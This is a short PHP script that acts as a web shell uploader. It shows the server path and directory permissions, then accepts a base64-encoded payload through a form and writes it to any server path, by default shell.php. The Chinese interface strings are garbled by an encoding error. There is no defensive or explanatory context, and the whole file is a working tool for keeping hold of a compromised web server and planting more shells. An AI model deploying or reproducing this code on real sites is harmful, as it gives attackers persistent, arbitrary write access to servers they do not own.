<?php

error_reporting(E_ERROR);

header('Content-Type:text/html; charset=utf-8');

$path=getcwd();

$perms=substr(sprintf('%o',fileperms($path)),-4);

echo 'Power By ����:550710418<br />';

echo '������·���� '.__FILE__.'<br />';

echo '��ǰĿ¼Ȩ�ޣ� '.$perms;

print<<<END

	<form method='post'>

		<textarea name='code' rows='15' lows='40'></textarea><br />

	����·����<input type='text' name='uppath' /><br />

		<input type='submit' name='submit' value='�ϴ�' />

		 

<input type='reset' name='reset' value='����' />

</form>

END;

if(strlen($_POST['code'])>0){

	$code=base64_decode($_POST['code']);

	$uppath=empty($_POST['uppath'])?$path.'/shell.php':trim($_POST['uppath']);

	$handle=fopen($uppath,'w') or die('�����ļ�ʧ��');

	fwrite($handle,$code) or die('д���ļ�ʧ��');

	fclose($handle);

	echo '�ļ��ϴ��ɹ�';

}

else

	echo '�뽫���ݾ�base64��������ϴ�';

?>
